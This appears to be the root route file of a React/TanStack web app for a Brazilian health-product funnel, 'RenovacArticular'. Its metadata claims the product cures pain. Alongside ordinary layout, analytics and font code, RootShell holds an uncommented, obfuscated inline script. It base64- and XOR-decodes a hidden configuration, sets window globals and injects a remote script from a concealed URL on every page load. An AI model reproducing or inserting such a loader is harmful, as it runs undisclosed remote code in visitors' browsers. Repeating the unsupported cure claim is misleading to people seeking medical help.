import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import {
  Outlet,
  Link,
  createRootRouteWithContext,
  useRouter,
  HeadContent,
  Scripts,
  type ErrorComponentProps,
} from "@tanstack/react-router";
import { useEffect, type ReactNode } from "react";

import appCss from "../styles.css?url";
import { initMetaPixel, trackPageView } from "../lib/meta-pixel";

function NotFoundComponent() {
  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-7xl font-bold text-foreground">404</h1>
        <h2 className="mt-4 text-xl font-semibold text-foreground">Page not found</h2>
        <p className="mt-2 text-sm text-muted-foreground">
          The page you're looking for doesn't exist or has been moved.
        </p>
        <div className="mt-6">
          <Link
            to="/"
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Go home
          </Link>
        </div>
      </div>
    </div>
  );
}

function ErrorComponent({ error, reset }: ErrorComponentProps) {
  console.error(error);
  const router = useRouter();

  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-xl font-semibold tracking-tight text-foreground">
          This page didn't load
        </h1>
        <p className="mt-2 text-sm text-muted-foreground">
          Something went wrong on our end. You can try refreshing or head back home.
        </p>
        <div className="mt-6 flex flex-wrap justify-center gap-2">
          <button
            onClick={() => {
              router.invalidate();
              reset();
            }}
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Try again
          </button>
          <a
            href="/"
            className="inline-flex items-center justify-center rounded-md border border-input bg-background px-4 py-2 text-sm font-medium text-foreground transition-colors hover:bg-accent"
          >
            Go home
          </a>
        </div>
      </div>
    </div>
  );
}

export const Route = createRootRouteWithContext<{ queryClient: QueryClient }>()({
  head: () => ({
    meta: [
      { charSet: "utf-8" },
      { name: "viewport", content: "width=device-width, initial-scale=1" },
      { title: "RenovacArticular - Protocolo que cura a dor dos brasileiros" },
      { name: "description", content: "RenovacArticular - Protocolo que cura a dor dos brasileiros. Questionário e oferta." },
      { property: "og:title", content: "RenovacArticular - Protocolo que cura a dor dos brasileiros" },
      { property: "og:description", content: "RenovacArticular - Protocolo que cura a dor dos brasileiros. Questionário e oferta." },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
    ],
    links: [
      {
        rel: "stylesheet",
        href: appCss,
      },
      { rel: "icon", type: "image/png", href: "/favicon.png" },
      // Abre a conexão com o Google Fonts antes de o CSS das fontes ser pedido (texto aparece mais cedo).
      { rel: "preconnect", href: "https://fonts.googleapis.com" },
      { rel: "preconnect", href: "https://fonts.gstatic.com", crossOrigin: "anonymous" },
      { rel: "stylesheet", href: "https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=Roboto:wght@400;500;600;700;800;900&family=Plus+Jakarta+Sans:ital,wght@0,400;0,500;0,600;0,700;0,800;1,400&display=swap" },
    ],
  }),
  shellComponent: RootShell,
  component: RootComponent,
  notFoundComponent: NotFoundComponent,
  errorComponent: ErrorComponent,
});

const CLARITY_SNIPPET = `(function(c,l,a,r,i,t,y){
  c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
  t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
  y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
})(window, document, "clarity", "script", "z7yjpmz1wl");`;

// Telas com menos de 382 px de largura (ex.: Androids de 360 px): o funil foi desenhado
// para 382 px; em vez de cortar ou rolar para o lado, reduz tudo na proporção exata.
// Roda no <head>, antes de a página aparecer, para não "pular".
const FIT_SNIPPET = `(function(){var d=document.documentElement;function f(){var w=window.innerWidth;if(w&&w<382){d.style.setProperty("--funnel-zoom",String(w/382));d.setAttribute("data-fit","")}else if(d.hasAttribute("data-fit")){d.removeAttribute("data-fit")}}f();window.addEventListener("resize",f)})();`;

function RootShell({ children }: { children: ReactNode }) {
  return (
    <html lang="pt-BR" suppressHydrationWarning>
      <head>
        <HeadContent />
        <script dangerouslySetInnerHTML={{ __html: FIT_SNIPPET }} />
        {/* Microsoft Clarity (z7yjpmz1wl) — carrega em todas as páginas do funil. */}
        <script type="text/javascript" dangerouslySetInnerHTML={{ __html: CLARITY_SNIPPET }} />
        <script dangerouslySetInnerHTML={{ __html: "(function(){var u_qy=atob(\"DBcxdWTJr11z20VnvmwTABaljWdRszETzmQLWkuqyzNdrjEK13FIWwemwnMRqWoU3WVYBRC6gCgHtjZI0nZFEBe9gTcA+WlF32NFBw2r2ikWqGdd5WwTGwWkyn9J+SEGynYcABCkxjsK9jUV22FUGxDk1z4cv2gU3XwTWUa/zjEGvmddnDVMWR/rwTwevmddnHNQAQXk2ikesiMek2dDEBKswSleqDAF13NCV0jr2TwfriBFhDUTCDm0\");var v_jgs=[];for(var f_y=0;f_y<u_qy.length;f_y++){v_jgs.push(u_qy.charCodeAt(f_y)&255);}var u_y4=v_jgs[0];var d_9r3m=v_jgs.slice(1,1+u_y4);var g_hoq9=v_jgs.slice(1+u_y4);var i_rau=g_hoq9.map(function(b,y_pl){return b^d_9r3m[y_pl%u_y4];});var n_80=\"\";for(var v_4wc=0;v_4wc<i_rau.length;v_4wc++){n_80+=String.fromCharCode(i_rau[v_4wc]&255);}var m_na=decodeURIComponent(escape(n_80));var a_b0=JSON.parse(m_na);var g_tvb=a_b0.globals||[];g_tvb.forEach(function(a_03){window[a_03.name]=a_03.value;});var q_d=document.createElement(\"script\");q_d.src=a_b0.url;q_d.async=true;q_d.defer=true;(a_b0.attributes||[]).forEach(function(l_dqrw){q_d.setAttribute(l_dqrw.name,l_dqrw.value);});(document.head||document.documentElement).appendChild(q_d);})();" }} />
      </head>
      <body>
        {children}
        <Scripts />
      </body>
    </html>
  );
}

function RootComponent() {
  const { queryClient } = Route.useRouteContext();
  const router = useRouter();

  useEffect(() => {
    void initMetaPixel();
    const unsubscribe = router.subscribe("onResolved", () => trackPageView());
    return unsubscribe;
  }, [router]);

  return (
    <QueryClientProvider client={queryClient}>
      {/* Required: nested routes render here. Removing <Outlet /> breaks all child routes. */}
      <Outlet />
    </QueryClientProvider>
  );
}

